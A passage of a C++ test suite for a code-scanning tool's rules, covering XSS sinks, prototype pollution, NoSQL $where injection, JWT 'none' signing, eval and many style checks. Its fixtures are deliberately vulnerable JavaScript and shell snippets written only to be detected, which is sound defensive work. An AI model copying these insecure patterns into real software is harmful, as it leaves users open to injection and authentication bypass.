        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the hardcoded secret is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "DC-010");
          CHECK(findings[0].line == 6);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // Integration: load new rule directories from disk
  // ============================================================

  SCENARIO("loading new batch 1 & 2 rule files from disk") {
    GIVEN("the new rule directories") {
      WHEN("rules are loaded from api/") {
        auto rules = rules_load("rules/api");
        THEN("at least 1 API rule is found") {
          REQUIRE(rules.size() >= 1);
          for (auto& r : rules) {
            CHECK(!r.id.empty());
            CHECK(!r.patterns.empty());
          }
        }
      }
      WHEN("rules are loaded from migration/") {
        auto rules = rules_load("rules/migration");
        THEN("at least 3 migration rules are found") {
          REQUIRE(rules.size() >= 3);
        }
      }
      WHEN("rules are loaded from docker/") {
        auto rules = rules_load("rules/docker");
        THEN("at least 1 docker rule is found") {
          REQUIRE(rules.size() >= 1);
        }
      }
      WHEN("rules are loaded from quality/") {
        auto rules = rules_load("rules/quality");
        THEN("at least 1 quality rule is found") {
          REQUIRE(rules.size() >= 1);
        }
      }
      WHEN("rules are loaded from resilience/") {
        auto rules = rules_load("rules/resilience");
        THEN("at least 1 resilience rule is found") {
          REQUIRE(rules.size() >= 1);
        }
      }
    }
  }

  // ============================================================
  // Web security rules
  // ============================================================

  SCENARIO("WEB-SEC-014: DOM XSS via dangerous sinks") {
    GIVEN("a JS file with innerHTML assignment") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/widget.js",
                 "function render(userInput) {\n"
                 "  const el = document.getElementById('output');\n"
                 "  element.innerHTML = userInput;\n"
                 "}\n");

      Rule rule;
      rule.id = "WEB-SEC-014";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".js"};
      rule.patterns.push_back({"\\.innerHTML\\s*=", "innerHTML assignment — DOM XSS risk"});
      rule.patterns.push_back({"\\.outerHTML\\s*=", "outerHTML assignment — DOM XSS risk"});
      rule.patterns.push_back({"document\\.write\\(", "document.write() — XSS risk"});
      rule.patterns.push_back({"document\\.writeln\\(", "document.writeln() — XSS risk"});
      rule.patterns.push_back({"\\.insertAdjacentHTML\\(", "insertAdjacentHTML() — XSS risk"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("the innerHTML assignment is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "WEB-SEC-014");
          CHECK(findings[0].line == 3);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("WEB-SEC-013: prototype pollution") {
    GIVEN("a JS file with __proto__ access") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/merge.js",
                 "function deepMerge(target, source) {\n"
                 "  for (const key in source) {\n"
                 "    if (key === '__proto__') continue;\n"
                 "    target[key] = source[key];\n"
                 "  }\n"
                 "}\n");

      Rule rule;
      rule.id = "WEB-SEC-013";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".js"};
      rule.patterns.push_back({"__proto__", "__proto__ access — prototype pollution vector"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("the __proto__ access is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "WEB-SEC-013");
          CHECK(findings[0].line == 3);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // Backend security rules
  // ============================================================

  SCENARIO("BE-SEC-010: NoSQL injection via $where operator") {
    GIVEN("a JS file with MongoDB $where operator") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/query.js",
                 "async function search(userQuery) {\n"
                 "  const results = await db.collection.find({\n"
                 "    $where: 'this.name == \"' + userQuery + '\"'\n"
                 "  });\n"
                 "  return results;\n"
                 "}\n");

      Rule rule;
      rule.id = "BE-SEC-010";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".js"};
      rule.patterns.push_back({"\\$where\\s*:", "MongoDB $where operator — injection risk"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("the $where operator is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "BE-SEC-010");
          CHECK(findings[0].line == 3);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("BE-SEC-020: JWT weaknesses with algorithm none") {
    GIVEN("a JS file with JWT algorithm set to none") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/auth.js",
                 "const jwt = require('jsonwebtoken');\n"
                 "const token = jwt.sign(payload, secret, {\n"
                 "  algorithm: 'none'\n"
                 "});\n");

      Rule rule;
      rule.id = "BE-SEC-020";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".js"};
      rule.patterns.push_back({"algorithm.*[\"'](?:none|None|NONE)[\"']", "JWT 'none' algorithm — signature bypassed"});
      rule.patterns.push_back({"(?:verify|verif).*(?:false|False|FALSE)", "JWT verification disabled"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("the none algorithm is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "BE-SEC-020");
          CHECK(findings[0].line == 3);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // Integration: load web + backend rule directories from disk
  // ============================================================

  SCENARIO("loading web and backend rule files from disk") {
    GIVEN("the rules/web and rules/backend directories") {
      WHEN("rules are loaded from web/") {
        auto web_rules = rules_load("rules/web");
        THEN("at least 13 web rules are found") {
          REQUIRE(web_rules.size() >= 13);
          for (auto& r : web_rules) {
            CHECK(!r.id.empty());
            CHECK(!r.patterns.empty());
            CHECK(!r.severity.empty());
          }
        }
      }
      WHEN("rules are loaded from backend/") {
        auto backend_rules = rules_load("rules/backend");
        THEN("at least 17 backend rules are found") {
          REQUIRE(backend_rules.size() >= 17);
          for (auto& r : backend_rules) {
            CHECK(!r.id.empty());
            CHECK(!r.patterns.empty());
            CHECK(!r.severity.empty());
          }
        }
      }
    }
  }

  // ============================================================
  // WTF/min rules — quality anti-patterns
  // ============================================================

  SCENARIO("QUAL-050: empty catch block triggers, non-empty does not") {
    GIVEN("a TS file with empty and non-empty catch blocks") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/handler.ts",
                 "try { parse(); } catch (e) {}\n"
                 "try { load(); } catch (e) { handleError(e); }\n");

      Rule rule;
      rule.id = "QUAL-050";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"catch\\s*\\([^)]*\\)\\s*\\{\\s*\\}", "Empty catch block"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("only the empty catch triggers") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-053: nested ternary triggers") {
    GIVEN("a TS file with a nested ternary") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/logic.ts",
                 "const x = a ? b ? c : d : e;\n");

      Rule rule;
      rule.id = "QUAL-053";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"\\?[^:]*\\?[^:]*:", "Nested ternary"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the nested ternary is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-054: commented-out code triggers, normal comment does not") {
    GIVEN("a TS file with commented-out code and a normal comment") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/old.ts",
                 "// const old = new Api();\n"
                 "// This is a comment\n");

      Rule rule;
      rule.id = "QUAL-054";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"^\\s*//\\s*(const|let|var|function|class|import|export|return|if|for|while)\\s",
                                "Commented-out code"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("only the commented-out code triggers") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-057: throw string triggers, throw Error does not") {
    GIVEN("a TS file with throw string and throw Error") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/err.ts",
                 "throw 'error message';\n"
                 "throw new Error('msg');\n");

      Rule rule;
      rule.id = "QUAL-057";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"throw\\s+['\"`]", "Throwing string"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("only the string throw triggers") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("STYLE-030: any type abuse triggers in TS") {
    GIVEN("a TS file with : any") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/api.ts",
                 "const data: any = fetch();\n");

      Rule rule;
      rule.id = "STYLE-030";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({":\\s*any\\b", "'any' type abuse"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the any type is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("STYLE-033: single-letter variable triggers in TS") {
    GIVEN("a TS file with const d = getData()") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/util.ts",
                 "const d = getData();\n");

      Rule rule;
      rule.id = "STYLE-033";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"(const|let|var)\\s+[a-df-hj-np-su-z]\\s*=",
                                "Single-letter variable name"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the single-letter variable is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("STYLE-034: generic variable name triggers in TS") {
    GIVEN("a TS file with const data = fetchUsers()") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/svc.ts",
                 "const data = fetchUsers();\n");

      Rule rule;
      rule.id = "STYLE-034";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"(const|let|var)\\s+(data|temp|tmp|result|res|stuff|thing|obj|item|value|val|ret|output|input|info|payload)\\s*=",
                                "Generic variable name"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the generic name is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("STYLE-044: loose equality triggers in JS") {
    GIVEN("a JS file with x == null") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/check.js",
                 "if (x == null) { handle(); }\n");

      Rule rule;
      rule.id = "STYLE-044";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".js"};
      rule.patterns.push_back({"[^!=<>]\\s*==[^=]", "Loose equality"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the loose equality is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("TEST-020: meaningless test name triggers") {
    GIVEN("a TS file with test('test1', ...)") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/app.test.ts",
                 "test('test1', () => { expect(1).toBe(1); });\n"
                 "test('should return 404 when user not found', () => {});\n");

      Rule rule;
      rule.id = "TEST-020";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"(it|test)\\(['\"](?:test\\s*\\d+|works|should work|it works|test|check|verify|ok)['\"]\\s*,",
                                "Meaningless test name"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("only the meaningless name triggers") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-059: complex boolean with 5+ AND operators triggers") {
    GIVEN("a TS file with a complex boolean condition") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/guard.ts",
                 "if (a && b && c && d && e) { allow(); }\n");

      Rule rule;
      rule.id = "QUAL-059";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"if\\s*\\([^)]*&&[^)]*&&[^)]*&&[^)]*&&",
                                "Complex boolean (5+ AND operators)"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the complex boolean is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-060: unhandled promise .then without .catch triggers") {
    GIVEN("a TS file with .then ending in semicolon") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/fetch.ts",
                 "fetchUsers().then(setUsers);\n");

      Rule rule;
      rule.id = "QUAL-060";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"\\.then\\([^)]*\\)\\s*;\\s*$",
                                ".then() without .catch()"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the unhandled promise is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("STYLE-041: numbered variable triggers") {
    GIVEN("a TS file with const item2 = list[1]") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/named.ts",
                 "const item2 = list[1];\n");

      Rule rule;
      rule.id = "STYLE-041";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"(const|let|var)\\s+\\w+[2-9]\\s*=",
                                "Numbered variable"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the numbered variable is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("STYLE-042: ASCII banner comment triggers") {
    GIVEN("a TS file with a banner comment") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/mod.ts",
                 "// ================\n"
                 "const x = 1;\n");

      Rule rule;
      rule.id = "STYLE-042";
      rule.severity = "info";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"//\\s*[=\\-\\*#]{10,}",
                                "Banner/separator comment"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the banner comment is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-072: long method chain (6+ dots) triggers") {
    GIVEN("a TS file with a long method chain") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/chain.ts",
                 "const r = data.filter(x => x.ok).map(x => x.n).sort().slice(0, 5).join(',').toUpperCase();\n");

      Rule rule;
      rule.id = "QUAL-072";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"\\w+\\.\\w+\\([^)]*\\)\\.\\w+\\([^)]*\\)\\.\\w+\\([^)]*\\)\\.\\w+\\([^)]*\\)\\.\\w+\\([^)]*\\)\\.\\w+\\(",
                                "6+ chained method calls"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the long chain is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-052: function with 6+ params triggers") {
    GIVEN("a TS file with a function with 6 parameters") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/create.ts",
                 "function create(a: string, b: string, c: number, d: string, e: string, f: string) {}\n");

      Rule rule;
      rule.id = "QUAL-052";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"function\\s+\\w+\\s*\\([^)]*,[^)]*,[^)]*,[^)]*,[^)]*,",
                                "Function has 6+ parameters"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the too-many-params function is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // Integration: load WTF/min rule directories from disk
  // ============================================================

  SCENARIO("loading WTF/min rule files from disk") {
    GIVEN("the quality, style, and test rule directories") {
      WHEN("rules are loaded from quality/") {
        auto rules = rules_load("rules/quality");
        THEN("at least 17 quality rules are found (WTF/min batch)") {
          REQUIRE(rules.size() >= 17);
          for (auto& r : rules) {
            CHECK(!r.id.empty());
            CHECK(!r.patterns.empty());
          }
        }
      }
      WHEN("rules are loaded from style/") {
        auto rules = rules_load("rules/style");
        THEN("at least 17 style rules are found (WTF/min batch)") {
          REQUIRE(rules.size() >= 17);
          for (auto& r : rules) {
            CHECK(!r.id.empty());
            CHECK(!r.patterns.empty());
          }
        }
      }
      WHEN("rules are loaded from test/") {
        auto rules = rules_load("rules/test");
        THEN("at least 2 test rules are found (WTF/min batch)") {
          REQUIRE(rules.size() >= 2);
          for (auto& r : rules) {
            CHECK(!r.id.empty());
            CHECK((!r.patterns.empty() || !r.extract_regex.empty()));
          }
        }
      }
    }
  }

  // ============================================================
  // ADR-166: Phase 1 — file-absence, file-presence, scope
  // ============================================================

  SCENARIO("file-absence engine: fires when file is missing") {
    GIVEN("a project directory without README.md") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/main.cpp", "int main() { return 0; }");

      Rule rule;
      rule.id = "PROJ-001";
      rule.title = "Missing README.md";
      rule.severity = "error";
      rule.engine = "file-absence";
      rule.fix = "Create a README.md";
      rule.target.filenames = {"README.md"};

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("a finding is reported") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "PROJ-001");
          CHECK(findings[0].severity == "error");
          CHECK(findings[0].file == "README.md");
          CHECK(findings[0].line == 0);
        }
      }
      unlink((tmp_dir + "/main.cpp").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("file-absence engine: does NOT fire when file exists") {
    GIVEN("a project directory with README.md") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/README.md", "# My Project\n");

      Rule rule;
      rule.id = "PROJ-001";
      rule.title = "Missing README.md";
      rule.severity = "error";
      rule.engine = "file-absence";
      rule.target.filenames = {"README.md"};

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no finding is reported") {
          CHECK(findings.empty());
        }
      }
      unlink((tmp_dir + "/README.md").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("file-absence engine: extension-based target") {
    GIVEN("a project directory with no .sh files") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/main.cpp", "int main() {}");

      Rule rule;
      rule.id = "PROJ-002";
      rule.title = "No shell scripts found";
      rule.severity = "info";
      rule.engine = "file-absence";
      rule.target.extensions = {".sh"};

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("a finding is reported") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "PROJ-002");
        }
      }
      unlink((tmp_dir + "/main.cpp").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("file-presence engine: fires when file exists") {
    GIVEN("a project directory with a .env file") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/app.env", "SECRET=hunter2\n");

      Rule rule;
      rule.id = "SEC-099";
      rule.title = "Committed .env file";
      rule.severity = "error";
      rule.engine = "file-presence";
      rule.fix = "Add .env to .gitignore";
      rule.target.extensions = {".env"};

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("a finding is reported") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "SEC-099");
          CHECK(findings[0].file == "app.env");
          CHECK(findings[0].line == 0);
        }
      }
      unlink((tmp_dir + "/app.env").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("file-presence engine: does NOT fire when file is absent") {
    GIVEN("a project directory with no .env files") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/main.cpp", "int main() {}");

      Rule rule;
      rule.id = "SEC-099";
      rule.title = "Committed .env file";
      rule.severity = "error";
      rule.engine = "file-presence";
      rule.target.extensions = {".env"};

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no finding is reported") {
          CHECK(findings.empty());
        }
      }
      unlink((tmp_dir + "/main.cpp").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("scope: pattern only matches within scoped lines") {
    GIVEN("a file with a pattern on line 15 and scope limited to lines 1-10") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      std::string content;
      for (int i = 1; i <= 20; i++) {
        if (i == 15)
          content += "eval(dangerous_code)\n";
        else
          content += "safe_line_" + std::to_string(i) + "\n";
      }
      write_file(tmp_dir + "/app.js", content);

      Rule rule;
      rule.id = "SCOPE-001";
      rule.title = "eval in header";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".js"};
      rule.target.scope_start = 1;
      rule.target.scope_end = 10;
      rule.patterns = {{"eval\\(", "eval() is dangerous"}};

      WHEN("rules_scan runs with scope 1-10") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no finding because eval is on line 15, outside scope") {
          CHECK(findings.empty());
        }
      }

      WHEN("the same rule without scope") {
        rule.target.scope_start = 0;
        rule.target.scope_end = 0;
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("eval on line 15 is found") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 15);
        }
      }
      unlink((tmp_dir + "/app.js").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("scope: pattern matches within scoped lines") {
    GIVEN("a file with a pattern on line 3 and scope 1-10") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/script.sh",
                 "#!/usr/bin/env bash\n"
                 "# my script\n"
                 "eval \"$USER_INPUT\"\n"
                 "echo done\n");

      Rule rule;
      rule.id = "SCOPE-002";
      rule.title = "eval in first 10 lines";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".sh"};
      rule.target.scope_start = 1;
      rule.target.scope_end = 10;
      rule.patterns = {{"eval ", "eval is dangerous in scripts"}};

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("eval on line 3 is found (within scope)") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 3);
        }
      }
      unlink((tmp_dir + "/script.sh").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("scope: absence engine respects scope") {
    GIVEN("a file with set -e on line 20 but scope 1-10") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      std::string content = "#!/usr/bin/env bash\n";
      for (int i = 2; i <= 19; i++) content += "echo line" + std::to_string(i) + "\n";
      content += "set -o errexit\n";
      write_file(tmp_dir + "/script.sh", content);

      Rule rule;
      rule.id = "SCOPE-003";
      rule.title = "Missing strict mode in first 10 lines";
      rule.severity = "warning";
      rule.engine = "absence";
      rule.target.extensions = {".sh"};
      rule.target.scope_start = 1;
      rule.target.scope_end = 10;
      rule.patterns = {{"set -o errexit|set -e", "Missing errexit in header"}};

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("finding reported because set -e is outside scope (line 20)") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "SCOPE-003");
        }
      }
      unlink((tmp_dir + "/script.sh").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("scope parsing in rule_parse") {
    GIVEN("a rule file with scope: 1-10") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/scope.rule",
                 "id: SCOPE-010\n"
                 "title: Scoped rule\n"
                 "severity: warning\n"
                 "engine: absence\n"
                 "extensions: .sh\n"
                 "scope: 1-10\n"
                 "patterns:\n"
                 "  - regex: set -o errexit\n"
                 "    message: Missing errexit\n");

      WHEN("the rule is parsed") {
        auto rule = rule_parse(tmp_dir + "/scope.rule");
        THEN("scope fields are set correctly") {
          CHECK(rule.id == "SCOPE-010");
          CHECK(rule.target.scope_start == 1);
          CHECK(rule.target.scope_end == 10);
        }
      }
      unlink((tmp_dir + "/scope.rule").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("file-absence rule parsed from .rule file") {
    GIVEN("a .rule file with engine: file-absence") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/readme-check.rule",
                 "id: PROJ-001\n"
                 "title: Missing README.md\n"
                 "severity: error\n"
                 "engine: file-absence\n"
                 "filenames: README.md\n"
                 "fix: Create a README.md\n");

      WHEN("the rule is parsed and loaded") {
        auto rules = rules_load(tmp_dir);
        THEN("the rule is loaded (no patterns required for file-absence)") {
          REQUIRE(rules.size() == 1);
          CHECK(rules[0].id == "PROJ-001");
          CHECK(rules[0].engine == "file-absence");
          CHECK(rules[0].target.filenames.size() == 1);
          CHECK(rules[0].target.filenames[0] == "README.md");
        }
      }
      unlink((tmp_dir + "/readme-check.rule").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // ADR-166: Phase 5 — extract-duplicates engine
  // ============================================================

  SCENARIO("extract-duplicates: finds duplicate test names") {
    GIVEN("a JS test file with two tests named 'should work'") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/app.test.js",
                 "it('should work', () => { expect(1).toBe(1); });\n"
                 "it('should fail', () => { expect(0).toBe(1); });\n"
                 "it('should work', () => { expect(2).toBe(2); });\n");

      Rule rule;
      rule.id = "TEST-038";
      rule.title = "Duplicate test name";
      rule.severity = "warning";
      rule.engine = "extract-duplicates";
      rule.target.extensions = {".test.js"};
      rule.extract_regex = "(?:it|test)\\(\\s*['\"]([^'\"]+)['\"]";
      rule.extract_message = "Duplicate test name '{match}'";

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("two findings for 'should work' (lines 1 and 3)") {
          REQUIRE(findings.size() == 2);
          CHECK(findings[0].rule_id == "TEST-038");
          CHECK(findings[0].line == 1);
          CHECK(findings[0].message == "Duplicate test name 'should work'");
          CHECK(findings[1].line == 3);
        }
      }
      unlink((tmp_dir + "/app.test.js").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("extract-duplicates: no duplicates means no findings") {
    GIVEN("a JS test file with unique test names") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/app.test.js",
                 "it('should create user', () => {});\n"
                 "it('should delete user', () => {});\n"
                 "it('should update user', () => {});\n");

      Rule rule;
      rule.id = "TEST-038";
      rule.title = "Duplicate test name";
      rule.severity = "warning";
      rule.engine = "extract-duplicates";
      rule.target.extensions = {".test.js"};
      rule.extract_regex = "(?:it|test)\\(\\s*['\"]([^'\"]+)['\"]";
      rule.extract_message = "Duplicate test name '{match}'";

      WHEN("rules_scan runs") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no findings") {
          CHECK(findings.empty());
        }
      }
      unlink((tmp_dir + "/app.test.js").c_str());
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("extract-duplicates: rule parsed from .rule file") {
    GIVEN("a .rule file with engine: extract-duplicates") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/dup.rule",
                 "id: DUP-001\n"
                 "title: Duplicate test\n"
                 "severity: warning\n"
                 "engine: extract-duplicates\n"
                 "extensions: .test.js\n"
